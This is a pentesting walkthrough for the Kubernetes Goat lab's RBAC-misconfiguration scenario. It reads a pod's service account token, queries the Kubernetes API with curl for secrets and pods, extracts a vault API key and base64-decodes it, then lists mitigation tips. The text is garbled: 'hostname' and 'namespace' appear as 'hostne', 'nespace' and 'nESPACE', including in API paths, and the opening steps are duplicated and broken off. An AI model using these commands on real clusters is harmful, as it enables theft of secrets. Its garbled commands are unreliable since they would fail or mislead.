https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster/welcome



Check service account details and all the tokens available in pod at 

```sh
cd /var/run/secrets/kubernetes.io/serviceaccount/
```

```sh
ls -larth
```

### 2. Export Environment Variables

Set up environment variables to interact with the Kubernetes API:

Now we can use this information to query and talk to the Kubernetes API service with the available permissions and privileges

To point to the internal API server hostne, we can export it from environment variables

#### Point to the Internal API Server Hostne
```sh
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
```

#### Set the Path to the ServiceAccount Token
```
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
```

#### Set the nespace Value

```
export nESPACE=$(cat ${SERVICEACCOUNT}/nespace)
```
#### Read the ServiceAccount Bearer Token

```
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
```
`
#### Point the ca.crt Path So That We Can Use It While Querying in the Curl Requests


```
export CACERT=${SERVICEACCOUNT}/ca.crt
```

### 3. Query the Kubernetes API


Now we can explore the Kubernetes API with the token and the constructed queries
#### Explore the Kubernetes API



```


Now we can explore the Kubernetes API with the token and the constructed queries
```

# Pentesting Note: Exploiting RBAC Misconfigurations in Kubernetes

## Objective
Leverage service account tokens to query and interact with the Kubernetes API, uncovering potential RBAC misconfigurations and vulnerabilities.

## Steps

### 1. Access Service Account Details
Retrieve service account tokens and details available in the pod:

```sh
cd /var/run/secrets/kubernetes.io/serviceaccount/
ls -larth
```

### 2. Export Environment Variables
Set up environment variables to interact with the Kubernetes API:

#### Point to the Internal API Server Hostne
```sh
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
```

#### Set the Path to the ServiceAccount Token
```sh
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
```

#### Set the nespace Value
```sh
export nESPACE=$(cat ${SERVICEACCOUNT}/nespace)
```

#### Read the ServiceAccount Bearer Token
```sh
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
```

#### Point to the CA Certificate Path
```sh
export CACERT=${SERVICEACCOUNT}/ca.crt
```

### 3. Query the Kubernetes API
Use the obtained token and setup to query the Kubernetes API:

#### Explore the Kubernetes API
```sh
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
```

#### Query Available Secrets in the Default nespace
```sh
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets
```

#### Query Secrets Specific to the nespace
```sh
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/nespaces/${nESPACE}/secrets
```

#### Query Pods in the Specific nespace
```sh
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/nespaces/${nESPACE}/pods
```

### 4. Extract and Decode Sensitive Information
From the obtained secrets, extract and decode sensitive information:

#### Get the `k8svaultapikey` Value from the Secrets
```sh
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/nespaces/${nESPACE}/secrets | grep k8svaultapikey
```

#### Decode the Base64 Encoded Value
```sh
echo "azhzLWdvYXQtODUwNTc4NDZhODA0NmGYzYTI2NDlkY2U=" | base64 -d
```

### Mitigation Tips
- **Limit Service Account Permissions**: Use the principle of least privilege to limit what service accounts can do.
- **Monitor API Requests**: Keep track of API requests and ensure they are authorized and authenticated.
- **Regular Audits**: Conduct regular audits of service account permissions and adjust as necessary.
- **Network Policies**: Implement network policies to restrict access to the Kubernetes API server.